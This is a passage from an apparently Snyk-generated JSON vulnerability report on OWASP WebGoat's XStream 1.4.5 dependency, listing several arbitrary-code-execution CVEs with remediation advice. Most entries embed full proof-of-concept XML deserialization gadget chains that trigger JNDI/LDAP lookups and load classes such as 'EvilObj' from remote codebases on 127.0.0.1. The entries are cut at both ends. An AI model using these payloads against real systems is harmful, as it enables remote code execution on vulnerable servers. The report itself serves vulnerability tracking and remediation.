</com.sun.jndi.ldap.LdapName>\r\n                                        </rdn>\r\n                                      </default>\r\n                                    </com.sun.jndi.ldap.LdapAttribute>\r\n                                  </com.sun.jndi.ldap.LdapAttribute>\r\n                                  <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\r\n                                    <javax.naming.directory.BasicAttribute>\r\n                                      <default>\r\n                                        <ordered>false</ordered>\r\n                                        <attrID>javaCodeBase</attrID>\r\n                                      </default>\r\n                                      <int>1</int>\r\n                                      <string>http://127.0.0.1:8080/</string>\r\n                                    </javax.naming.directory.BasicAttribute>\r\n                                    <com.sun.jndi.ldap.LdapAttribute>\r\n                                      <default/>\r\n                                    </com.sun.jndi.ldap.LdapAttribute>\r\n                                  </com.sun.jndi.ldap.LdapAttribute>\r\n                                  <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\r\n                                    <javax.naming.directory.BasicAttribute>\r\n                                      <default>\r\n                                        <ordered>false</ordered>\r\n                                        <attrID>javaClassName</attrID>\r\n                                      </default>\r\n                                      <int>1</int>\r\n                                      <string>refObj</string>\r\n                                    </javax.naming.directory.BasicAttribute>\r\n                                    <com.sun.jndi.ldap.LdapAttribute>\r\n                                      <default/>\r\n                                    </com.sun.jndi.ldap.LdapAttribute>\r\n                                  </com.sun.jndi.ldap.LdapAttribute>\r\n                                  <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\r\n                                    <javax.naming.directory.BasicAttribute>\r\n                                      <default>\r\n                                        <ordered>false</ordered>\r\n                                        <attrID>javaFactory</attrID>\r\n                                      </default>\r\n                                      <int>1</int>\r\n                                      <string>ExecTemplateJDK7</string>\r\n                                    </javax.naming.directory.BasicAttribute>\r\n                                    <com.sun.jndi.ldap.LdapAttribute>\r\n                                      <default/>\r\n                                    </com.sun.jndi.ldap.LdapAttribute>\r\n                                  </com.sun.jndi.ldap.LdapAttribute>\r\n                                </javax.naming.directory.BasicAttribute>\r\n                              </attributes>\r\n                            </com.sun.jndi.ldap.LdapEntry>\r\n                          </entries>\r\n                          <limit>2</limit>\r\n                          <posn>0</posn>\r\n                          <homeCtx/>\r\n                          <more>true</more>\r\n                          <hasMoreCalled>true</hasMoreCalled>\r\n                        </aliases>\r\n                      </it>\r\n                    </mm>\r\n                  </multiPart>\r\n                </sm>\r\n              </message>\r\n            </com.sun.xml.internal.ws.api.message.Packet>\r\n          </edits>\r\n          <indexOfNextAdd>0</indexOfNextAdd>\r\n          <limit>100</limit>\r\n        </javax.swing.undo.UndoManager>\r\n      </listenerList>\r\n    </default>\r\n    <string>java.lang.InternalError</string>\r\n    <javax.swing.undo.UndoManager reference='../default/listenerList/javax.swing.undo.UndoManager'/>\r\n    <null/>\r\n  </javax.swing.event.EventListenerList>\r\n</javax.swing.event.EventListenerList>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39151.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T07:53:09Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569179",
      "identifiers": {
        "CWE": [
          "CWE-434"
        ],
        "GHSA": [
          "GHSA-hph2-m3g5-xxv4"
        ],
        "CVE": [
          "CVE-2021-39151"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-24T15:09:25.490194Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:25.488370Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39151.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:42:23.585960Z"
        },
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:27.293615Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T21:35:49.155062Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T07:58:23.064814Z",
      "credit": [
        "Ceclin and YXXX"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. This vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.\r\n\r\n\r\n### PoC\r\n\r\n```\r\n<sorted-set>\r\n  <javax.naming.ldap.Rdn_-RdnEntry>\r\n    <type>test</type>\r\n    <value class='javax.swing.MultiUIDefaults' serialization='custom'>\r\n      <unserializable-parents/>\r\n      <hashtable>\r\n          <default>\r\n            <loadFactor>0.75</loadFactor>\r\n            <threshold>525</threshold>\r\n          </default>\r\n          <int>700</int>\r\n          <int>0</int>\r\n      </hashtable>\r\n      <javax.swing.UIDefaults>\r\n          <default>\r\n            <defaultLocale>zh_CN</defaultLocale>\r\n            <resourceCache/>\r\n          </default>\r\n      </javax.swing.UIDefaults>\r\n      <javax.swing.MultiUIDefaults>\r\n          <default>\r\n            <tables>\r\n            <javax.swing.UIDefaults serialization='custom'>\r\n              <unserializable-parents/>\r\n              <hashtable>\r\n                <default>\r\n                  <loadFactor>0.75</loadFactor>\r\n                  <threshold>525</threshold>\r\n                </default>\r\n                <int>700</int>\r\n                <int>1</int>\r\n                <string>lazyValue</string>\r\n                <javax.swing.UIDefaults_-ProxyLazyValue>\r\n                  <className>javax.naming.InitialContext</className>\r\n                  <methodName>doLookup</methodName>\r\n                  <args>\r\n                    <string>ldap://127.0.0.1:1389/#evil</string>\r\n                  </args>\r\n                </javax.swing.UIDefaults_-ProxyLazyValue>\r\n              </hashtable>\r\n              <javax.swing.UIDefaults>\r\n                <default>\r\n                  <defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/>\r\n                  <resourceCache/>\r\n                </default>\r\n              </javax.swing.UIDefaults>\r\n            </javax.swing.UIDefaults>\r\n            </tables>\r\n          </default>\r\n      </javax.swing.MultiUIDefaults>\r\n    </value>\r\n  </javax.naming.ldap.Rdn_-RdnEntry>\r\n  <javax.naming.ldap.Rdn_-RdnEntry>\r\n    <type>test</type>\r\n    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\r\n      <m__obj class='string'>test</m__obj>\r\n    </value>\r\n  </javax.naming.ldap.Rdn_-RdnEntry>\r\n</sorted-set>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39146.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T07:56:49Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569180",
      "identifiers": {
        "CWE": [
          "CWE-434"
        ],
        "GHSA": [
          "GHSA-p8pq-r894-fm8f"
        ],
        "CVE": [
          "CVE-2021-39146"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-24T15:09:25.256143Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:25.253783Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39146.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:34.817655Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T21:34:41.813992Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:36:13.747621Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T08:01:41.106128Z",
      "credit": [
        "wh1t3p1g"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. This vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.\r\n\r\n### PoC\r\n\r\n```\r\n<sorted-set>\r\n  <javax.naming.ldap.Rdn_-RdnEntry>\r\n    <type>ysomap</type>\r\n    <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\r\n      <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\r\n        <parsedMessage>true</parsedMessage>\r\n        <soapVersion>SOAP_11</soapVersion>\r\n        <bodyParts/>\r\n        <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\r\n          <attachmentsInitialized>false</attachmentsInitialized>\r\n          <multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'>\r\n            <soapPart/>\r\n            <mm>\r\n              <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\r\n                <aliases class='com.sun.jndi.toolkit.dir.ContextEnumerator'>\r\n                  <children class='javax.naming.directory.BasicAttribute$ValuesEnumImpl'>\r\n                    <list class='com.sun.xml.internal.dtdparser.SimpleHashtable'>\r\n                      <current>\r\n                        <hash>1</hash>\r\n                        <key class='javax.naming.Binding'>\r\n                          <name>ysomap</name>\r\n                          <isRel>false</isRel>\r\n                            <boundObj class='com.sun.jndi.ldap.LdapReferralContext'>\r\n                              <refCtx class='javax.naming.spi.ContinuationDirContext'>\r\n                                <cpe>\r\n                                  <stackTrace/>\r\n                                  <suppressedExceptions class='java.util.Collections$UnmodifiableRandomAccessList' resolves-to='java.util.Collections$UnmodifiableList'>\r\n                                    <c class='list'/>\r\n                                    <list reference='../c'/>\r\n                                  </suppressedExceptions>\r\n                                  <resolvedObj class='javax.naming.Reference'>\r\n                                    <className>EvilObj</className>\r\n                                    <addrs/>\r\n                                    <classFactory>EvilObj</classFactory>\r\n                                    <classFactoryLocation>http://127.0.0.1:1099/</classFactoryLocation>\r\n                                  </resolvedObj>\r\n                                  <altName class='javax.naming.CompoundName' serialization='custom'>\r\n                                    <javax.naming.CompoundName>\r\n                                      <properties/>\r\n                                      <int>1</int>\r\n                                      <string>ysomap</string>\r\n                                    </javax.naming.CompoundName>\r\n                                  </altName>\r\n                                </cpe>\r\n                              </refCtx>\r\n                              <skipThisReferral>false</skipThisReferral>\r\n                              <hopCount>0</hopCount>\r\n                            </boundObj>\r\n                        </key>\r\n                      </current>\r\n                      <currentBucket>0</currentBucket>\r\n                      <count>0</count>\r\n                      <threshold>0</threshold>\r\n                    </list>\r\n                  </children>\r\n                  <currentReturned>true</currentReturned>\r\n                  <currentChildExpanded>false</currentChildExpanded>\r\n                  <rootProcessed>true</rootProcessed>\r\n                  <scope>2</scope>\r\n                </aliases>\r\n              </it>\r\n            </mm>\r\n          </multiPart>\r\n        </sm>\r\n      </message>\r\n    </value>\r\n  </javax.naming.ldap.Rdn_-RdnEntry>\r\n  <javax.naming.ldap.Rdn_-RdnEntry>\r\n    <type>ysomap</type>\r\n    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\r\n      <m__obj class='string'>test</m__obj>\r\n    </value>\r\n  </javax.naming.ldap.Rdn_-RdnEntry>\r\n</sorted-set>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39148.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T08:00:40Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569181",
      "identifiers": {
        "CWE": [
          "CWE-434"
        ],
        "GHSA": [
          "GHSA-qrx8-8545-4wg2"
        ],
        "CVE": [
          "CVE-2021-39148"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-24T15:09:25.015193Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:25.013194Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39148.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:42:18.394551Z"
        },
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:28.190571Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T21:35:26.381027Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T08:14:45.151211Z",
      "credit": [
        "wh1t3p1g"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. This vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.\r\n\r\n### PoC\r\n\r\n```\r\n<sorted-set>\r\n  <javax.naming.ldap.Rdn_-RdnEntry>\r\n    <type>ysomap</type>\r\n    <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\r\n      <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\r\n        <parsedMessage>true</parsedMessage>\r\n        <soapVersion>SOAP_11</soapVersion>\r\n        <bodyParts/>\r\n        <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\r\n          <attachmentsInitialized>false</attachmentsInitialized>\r\n          <multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'>\r\n            <soapPart/>\r\n            <mm>\r\n              <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\r\n                <aliases class='com.sun.jndi.ldap.LdapSearchEnumeration'>\r\n                  <listArg class='javax.naming.CompoundName' serialization='custom'>\r\n                    <javax.naming.CompoundName>\r\n                      <properties/>\r\n                      <int>1</int>\r\n                      <string>ysomap</string>\r\n                    </javax.naming.CompoundName>\r\n                  </listArg>\r\n                  <cleaned>false</cleaned>\r\n                  <res>\r\n                    <msgId>0</msgId>\r\n                    <status>0</status>\r\n                  </res>\r\n                  <enumClnt>\r\n                    <isLdapv3>false</isLdapv3>\r\n                    <referenceCount>0</referenceCount>\r\n                    <pooled>false</pooled>\r\n                    <authenticateCalled>false</authenticateCalled>\r\n                  </enumClnt>\r\n                  <limit>1</limit>\r\n                  <posn>0</posn>\r\n                  <homeCtx>\r\n                    <__contextType>0</__contextType>\r\n                    <port__number>1099</port__number>\r\n                    <hostname>127.0.0.1</hostname>\r\n                    <clnt reference='../../enumClnt'/>\r\n                    <handleReferrals>0</handleReferrals>\r\n                    <hasLdapsScheme>true</hasLdapsScheme>\r\n                    <netscapeSchemaBug>false</netscapeSchemaBug>\r\n                    <referralHopLimit>0</referralHopLimit>\r\n                    <batchSize>0</batchSize>\r\n                    <deleteRDN>false</deleteRDN>\r\n                    <typesOnly>false</typesOnly>\r\n                    <derefAliases>0</derefAliases>\r\n                    <addrEncodingSeparator/>\r\n                    <connectTimeout>0</connectTimeout>\r\n                    <readTimeout>0</readTimeout>\r\n                    <waitForReply>false</waitForReply>\r\n                    <replyQueueSize>0</replyQueueSize>\r\n                    <useSsl>false</useSsl>\r\n                    <useDefaultPortNumber>false</useDefaultPortNumber>\r\n                    <parentIsLdapCtx>false</parentIsLdapCtx>\r\n                    <hopCount>0</hopCount>\r\n                    <unsolicited>false</unsolicited>\r\n                    <sharable>false</sharable>\r\n                    <enumCount>1</enumCount>\r\n                    <closeRequested>false</closeRequested>\r\n                  </homeCtx>\r\n                  <more>true</more>\r\n                  <hasMoreCalled>true</hasMoreCalled>\r\n                  <startName class='javax.naming.ldap.LdapName' serialization='custom'>\r\n                    <javax.naming.ldap.LdapName>\r\n                      <default/>\r\n                      <string>uid=ysomap,ou=oa,dc=example,dc=com</string>\r\n                    </javax.naming.ldap.LdapName>\r\n                  </startName>\r\n                  <searchArgs>\r\n                    <name class='javax.naming.CompoundName' reference='../../listArg'/>\r\n                    <filter>ysomap</filter>\r\n                    <cons>\r\n                      <searchScope>1</searchScope>\r\n                      <timeLimit>0</timeLimit>\r\n                      <derefLink>false</derefLink>\r\n                      <returnObj>true</returnObj>\r\n                      <countLimit>0</countLimit>\r\n                    </cons>\r\n                    <reqAttrs/>\r\n                  </searchArgs>\r\n                  <entries>\r\n                    <com.sun.jndi.ldap.LdapEntry>\r\n                      <DN>uid=songtao.xu,ou=oa,dc=example,dc=com</DN>\r\n                      <attributes class='javax.naming.directory.BasicAttributes' serialization='custom'>\r\n                        <default>\r\n                          <ignoreCase>false</ignoreCase>\r\n                        </default>\r\n                        <int>4</int>\r\n                        <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\r\n                          <javax.naming.directory.BasicAttribute>\r\n                            <default>\r\n                              <ordered>false</ordered>\r\n                              <attrID>objectClass</attrID>\r\n                            </default>\r\n                            <int>1</int>\r\n                            <string>javaNamingReference</string>\r\n                          </javax.naming.directory.BasicAttribute>\r\n                          <com.sun.jndi.ldap.LdapAttribute>\r\n                            <default>\r\n                              <rdn class=''javax.naming.CompositeName'' serialization=''custom''>\r\n                                <javax.naming.CompositeName>\r\n                                  <int>0</int>\r\n                                </javax.naming.CompositeName>\r\n                              </rdn>\r\n                            </default>\r\n                          </com.sun.jndi.ldap.LdapAttribute>\r\n                        </com.sun.jndi.ldap.LdapAttribute>\r\n                        <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\r\n                          <javax.naming.directory.BasicAttribute>\r\n                            <default>\r\n                              <ordered>false</ordered>\r\n                              <attrID>javaCodeBase</attrID>\r\n                            </default>\r\n                            <int>1</int>\r\n                            <string>http://127.0.0.1/</string>\r\n                          </javax.naming.directory.BasicAttribute>\r\n                          <com.sun.jndi.ldap.LdapAttribute>\r\n                            <default>\r\n                              <rdn class=''javax.naming.CompositeName'' serialization=''custom''>\r\n                                <javax.naming.CompositeName>\r\n                                  <int>0</int>\r\n                                </javax.naming.CompositeName>\r\n                              </rdn>\r\n                            </default>\r\n                          </com.sun.jndi.ldap.LdapAttribute>\r\n                        </com.sun.jndi.ldap.LdapAttribute>\r\n                        <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\r\n                          <javax.naming.directory.BasicAttribute>\r\n                            <default>\r\n                              <ordered>false</ordered>\r\n                              <attrID>javaClassName</attrID>\r\n                            </default>\r\n                            <int>1</int>\r\n                            <string>foo</string>\r\n                          </javax.naming.directory.BasicAttribute>\r\n                          <com.sun.jndi.ldap.LdapAttribute>\r\n                            <default>\r\n                              <rdn class=''javax.naming.CompositeName'' serialization=''custom''>\r\n                                <javax.naming.CompositeName>\r\n                                  <int>0</int>\r\n                                </javax.naming.CompositeName>\r\n                              </rdn>\r\n                            </default>\r\n                          </com.sun.jndi.ldap.LdapAttribute>\r\n                        </com.sun.jndi.ldap.LdapAttribute>\r\n                        <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\r\n                          <javax.naming.directory.BasicAttribute>\r\n                            <default>\r\n                              <ordered>false</ordered>\r\n                              <attrID>javaFactory</attrID>\r\n                            </default>\r\n                            <int>1</int>\r\n                            <string>EvilObj</string>\r\n                          </javax.naming.directory.BasicAttribute>\r\n                          <com.sun.jndi.ldap.LdapAttribute>\r\n                            <default>\r\n                              <rdn class=''javax.naming.CompositeName'' serialization=''custom''>\r\n                                <javax.naming.CompositeName>\r\n                                  <int>0</int>\r\n                                </javax.naming.CompositeName>\r\n                              </rdn>\r\n                            </default>\r\n                          </com.sun.jndi.ldap.LdapAttribute>\r\n                        </com.sun.jndi.ldap.LdapAttribute>\r\n                      </attributes>\r\n                    </com.sun.jndi.ldap.LdapEntry>\r\n                  </entries>\r\n                </aliases>\r\n              </it>\r\n            </mm>\r\n          </multiPart>\r\n        </sm>\r\n      </message>\r\n    </value>\r\n  </javax.naming.ldap.Rdn_-RdnEntry>\r\n  <javax.naming.ldap.Rdn_-RdnEntry>\r\n    <type>ysomap</type>\r\n    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\r\n      <m__obj class='string'>test</m__obj>\r\n    </value>\r\n  </javax.naming.ldap.Rdn_-RdnEntry>\r\n</sorted-set>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39147.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T08:13:11Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569182",
      "identifiers": {
        "CWE": [
          "CWE-434"
        ],
        "GHSA": [
          "GHSA-h7v4-7xg3-hxcc"
        ],
        "CVE": [
          "CVE-2021-39147"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-24T15:09:24.764635Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:24.762736Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39147.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:32.275173Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T21:35:21.169827Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:42:22.368062Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T08:20:29.336468Z",
      "credit": [
        "Ceclin and YXXX"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE). This vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.\r\n\r\n### PoC\r\n\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n    </default>\r\n    <int>3</int>\r\n    <dynamic-proxy>\r\n      <interface>java.lang.Comparable</interface>\r\n      <handler class='sun.tracing.NullProvider'>\r\n        <active>true</active>\r\n        <providerType>java.lang.Comparable</providerType>\r\n        <probes>\r\n          <entry>\r\n            <method>\r\n              <class>java.lang.Comparable</class>\r\n              <name>compareTo</name>\r\n              <parameter-types>\r\n                <class>java.lang.Object</class>\r\n              